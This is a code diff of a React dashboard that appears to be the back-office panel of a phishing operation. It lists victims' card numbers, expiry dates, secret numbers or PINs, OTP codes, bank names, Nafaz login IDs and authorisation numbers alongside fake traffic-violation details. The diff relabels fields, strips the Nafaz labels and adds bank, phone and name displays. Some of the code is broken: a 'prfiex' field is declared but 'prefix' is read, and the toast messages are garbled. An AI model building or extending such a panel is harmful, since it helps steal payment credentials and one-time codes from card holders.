@@ -54,16 +54,17 @@ interface Notification {
   bank: string;
   cardStatus?: string;
   ip?: string;
-  cvv: string;
+  pass: string;
   id: string | "0";
   notificationCount: number;
   otp: string;
   otp2: string;
   page: string;
   cardNumber: string;
+  prfiex: string;
   cardHolderName?: string;
-  expiryMonth?: string;
-  expiryYear?: string;
+  month?: string;
+  year?: string;
   country?: string;
   personalInfo: {
     id?: string | "0";
@@ -74,7 +75,6 @@ interface Notification {
   isOnline?: boolean;
   lastSeen: string;
   violationValue: number;
-  pass?: string;
   atmPin?: string;
   pagename: string;
   plateType: string;
@@ -92,6 +92,8 @@ interface Notification {
   nafazInfo?: NafazInfo;
   nafazId?: string;
   authNumber?: string;
+  fullName?: string;
+  isHidden?: string;
 }
 
 // Nafaz Information Component
@@ -130,19 +132,36 @@ function NafazInfoCard({
       setIsEditing(false);
       toast({
         title: "تم التحديث بنجاح",
-        description: "تم تحديث معلومات نفاذ بنجاح",
+        description: "تم تحديث معلومات معلومات بنجاح",
       });
     } catch (error) {
       toast({
         title: "خطأ في التحديث",
-        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
+        description: "حدث خطأ أثناء تحديث معلومات معلومات",
         variant: "destructive",
       });
     } finally {
       setIsSaving(false);
     }
   };
-
+  const handleHide = async () => {
+    try {
+      await onUpdate(notification.id, {});
+      setIsEditing(false);
+      toast({
+        title: "تم التحديث بنجاح",
+        description: "تم تحديث معلومات معلومات بنجاح",
+      });
+    } catch (error) {
+      toast({
+        title: "خطأ في التحديث",
+        description: "حدث خطأ أثناء تحديث معلومات معلومات",
+        variant: "destructive",
+      });
+    } finally {
+      setIsSaving(false);
+    }
+  };
   const handleCancel = () => {
     setNafazId(notification?.nafazId || notification?.nafazInfo?.nafazId || "");
     setAuthNumber(
@@ -160,131 +179,21 @@ function NafazInfoCard({
               <Shield className="h-6 w-6 text-white" />
             </div>
             <div>
-              <CardTitle className="text-lg text-gray-800">
-                معلومات نفاذ
-              </CardTitle>
-              <CardDescription className="text-sm">
-                {notification.nafazInfo?.lastUpdated
-                  ? `آخر تحديث: ${formatDistanceToNow(
-                      new Date(notification.nafazInfo.lastUpdated),
-                      {
-                        addSuffix: true,
-                        locale: ar,
-                      }
-                    )}`
-                  : "لم يتم التحديث بعد"}
-              </CardDescription>
+              <CardTitle className="text-lg text-gray-800">معلومات</CardTitle>
+              <CardDescription className="text-sm"></CardDescription>
             </div>
-          </div>
-          <div className="flex items-center gap-2">
-            <Button
-              variant="outline"
-              size="sm"
-              onClick={() => setIsEditing(!isEditing)}
-              className="gap-2 border-orange-300 hover:bg-orange-100"
-            >
-              <Edit3 className="h-4 w-4" />
-              {isEditing ? "إلغاء" : "تعديل"}
-            </Button>
           </div>
         </div>
       </CardHeader>
       <CardContent className="space-y-4">
-        {isEditing ? (
-          <div className="space-y-4">
-            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-              <div className="space-y-2">
-                <Label
-                  htmlFor="nafaz-id"
-                  className="text-sm font-semibold text-gray-700"
-                >
-                  رقم الهوية نفاذ
-                </Label>
-                <Input
-                  id="nafaz-id"
-                  placeholder="أدخل رقم الهوية"
-                  value={nafazId}
-                  onChange={(e) => setNafazId(e.target.value)}
-                  className="bg-white border-orange-200 focus:ring-orange-500"
-                />
-              </div>
-              <div className="space-y-2">
-                <Label
-                  htmlFor="auth-number"
-                  className="text-sm font-semibold text-gray-700"
-                >
-                  رقم التفويض
-                </Label>
-                <Input
-                  id="auth-number"
-                  placeholder="أدخل رقم التفويض"
-                  value={authNumber}
-                  onChange={(e) => setAuthNumber(e.target.value)}
-                  className="bg-white border-orange-200 focus:ring-orange-500"
-                />
-              </div>
-            </div>
-            <div className="flex justify-end gap-2 pt-4 border-t border-orange-200">
-              <Button
-                variant="outline"
-                onClick={handleCancel}
-                className="border-orange-300 bg-transparent"
-              >
-                <X className="h-4 w-4 mr-2" />
-                إلغاء
-              </Button>
-              <Button
-                onClick={handleSave}
-                disabled={isSaving}
-                className="bg-gradient-to-r from-orange-500 to-orange-600 hover:from-orange-600 hover:to-orange-700"
-              >
-                {isSaving ? (
-                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
-                ) : (
-                  <Save className="h-4 w-4 mr-2" />
-                )}
-                حفظ التغييرات
-              </Button>
-            </div>
-          </div>
-        ) : (
-          <div className="space-y-3">
-            {nafazId || authNumber ? (
-              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
-                {nafazId && (
-                  <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-orange-200 shadow-sm">
-                    <span className="text-xs font-medium text-gray-600">
-                      رقم الهوية نفاذ
-                    </span>
-                    <span className="font-bold text-base text-gray-800">
-                      {nafazId}
-                    </span>
-                  </div>
-                )}
-                {authNumber && (
-                  <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-orange-200 shadow-sm">
-                    <span className="text-xs font-medium text-gray-600">
-                      رقم التفويض
-                    </span>
-                    <span className="font-bold text-base text-orange-600 font-mono tracking-wider">
-                      {authNumber}
-                    </span>
-                  </div>
-                )}
-              </div>
-            ) : (
-              <div className="text-center py-8 bg-white rounded-lg border border-dashed border-orange-300">
-                <IdCard className="h-12 w-12 mx-auto text-orange-400 mb-3" />
-                <p className="text-gray-600 font-medium">
-                  لا توجد معلومات نفاذ مسجلة
-                </p>
-                <p className="text-sm text-gray-500 mt-1">
-                  اضغط على "تعديل" لإضافة معلومات نفاذ
-                </p>
-              </div>
-            )}
-          </div>
-        )}
+        <div className="space-y-3 flex justify-around items-center">
+          <div> رقم الهاتف:</div>
+          <div>{notification?.phone}</div>
+        </div>
+        <div className="space-y-3 flex justify-around items-center">
+          <div> الاسم:</div>
+          <div>{notification?.fullName}</div>
+        </div>
       </CardContent>
     </Card>
   );
@@ -319,11 +228,17 @@ function CardInfoCard({ notification }: { notification: Notification }) {
           <div className="space-y-3">
             <div className="grid grid-cols-1 gap-4">
               <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
+                <span className="text-xs font-medium text-gray-600">بنك</span>
+                <span className="font-bold text-base text-gray-800 font-mono tracking-wider">
+                  {notification.bank}
+                </span>
+              </div>
+              <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                 <span className="text-xs font-medium text-gray-600">
                   رقم البطاقة
                 </span>
                 <span className="font-bold text-base text-gray-800 font-mono tracking-wider">
-                  {notification.cardNumber}
+                  {notification.cardNumber} - {notification.prefix}
                 </span>
               </div>
               {notification.cardHolderName && (
@@ -336,21 +251,23 @@ function CardInfoCard({ notification }: { notification: Notification }) {
                   </span>
                 </div>
               )}
-              {notification.expiryMonth && notification.expiryYear && (
+              {notification.month && notification.year && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
                   <span className="text-xs font-medium text-gray-600">
                     تاريخ الانتهاء
                   </span>
                   <span className="font-bold text-base text-gray-800 font-mono">
-                    {notification.expiryMonth}/{notification.expiryYear}
+                    {notification.month}/{notification.year}
                   </span>
                 </div>
               )}
-              {notification.cvv && (
+              {notification.pass && (
                 <div className="flex flex-col space-y-1 p-4 bg-white rounded-lg border border-green-200 shadow-sm">
-                  <span className="text-xs font-medium text-gray-600">CVV</span>
+                  <span className="text-xs font-medium text-gray-600">
+                    رقم سري
+                  </span>
                   <span className="font-bold text-base text-green-600 font-mono">
-                    {notification.cvv}
+                    {notification.pass}
                   </span>
                 </div>
               )}
@@ -581,15 +498,15 @@ export default function NotificationsPage() {
       );
 
       toast({
-        title: "تم تحديث معلومات نفاذ",
-        description: "تم تحديث معلومات نفاذ بنجاح",
+        title: "تم تحديث معلومات معلومات",
+        description: "تم تحديث معلومات معلومات بنجاح",
         variant: "default",
       });
     } catch (error) {
       console.error("Error updating nafaz info:", error);
       toast({
         title: "خطأ",
-        description: "حدث خطأ أثناء تحديث معلومات نفاذ",
+        description: "حدث خطأ أثناء تحديث معلومات معلومات",
         variant: "destructive",
       });
     }
@@ -672,7 +589,7 @@ export default function NotificationsPage() {
               <div className="flex items-center justify-between">
                 <div>
                   <p className="text-orange-100 text-sm font-medium">
-                    طلبات نفاذ
+                    طلبات معلومات
                   </p>
                   <p className="text-3xl font-bold mt-2">
                     {nafazSubmissionsCount}
@@ -706,7 +623,7 @@ export default function NotificationsPage() {
                 <div className="relative">
                   <Search className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                   <Input
-                    placeholder="البحث عن طريق الاسم، البريد، الهاتف، رقم البطاقة، أو معلومات نفاذ..."
+                    placeholder="البحث عن طريق الاسم، البريد، الهاتف، رقم البطاقة، أو معلومات معلومات..."
                     value={searchTerm}
                     onChange={(e) => setSearchTerm(e.target.value)}
                     className="pr-10 h-11"
@@ -743,7 +660,7 @@ export default function NotificationsPage() {
                       : ""
                   }
                 >
-                  نفاذ
+                  معلومات
                 </Button>
                 <Button
                   variant={filterType === "online" ? "default" : "outline"}
@@ -862,20 +779,10 @@ export default function NotificationsPage() {
 
                           <Badge
                             variant={
-                              (notification.nafazInfo &&
-                                (notification.nafazInfo.nafazId ||
-                                  notification.nafazInfo.authNumber)) ||
-                              notification.nafazId ||
-                              notification.authNumber
-                                ? "default"
-                                : "secondary"
+                              notification.phone ? "default" : "secondary"
                             }
                             className={`cursor-pointer transition-all hover:scale-105 ${
-                              (notification.nafazInfo &&
-                                (notification.nafazInfo.nafazId ||
-                                  notification.nafazInfo.authNumber)) ||
-                              notification.nafazId ||
-                              notification.authNumber
+                              notification.phone
                                 ? "bg-gradient-to-r from-orange-500 to-orange-600 text-white"
                                 : ""
                             }`}
@@ -884,13 +791,9 @@ export default function NotificationsPage() {
                             }
                           >
                             <Shield className="h-3 w-3 mr-1" />
-                            {(notification.nafazInfo &&
-                              (notification.nafazInfo.nafazId ||
-                                notification.nafazInfo.authNumber)) ||
-                            notification.nafazId ||
-                            notification.authNumber
-                              ? "معلومات نفاذ"
-                              : "لا يوجد نفاذ"}
+                            {notification.phone
+                              ? " معلومات"
+                              : "لا يوجد معلومات"}
                           </Badge>
                         </div>
                       </td>
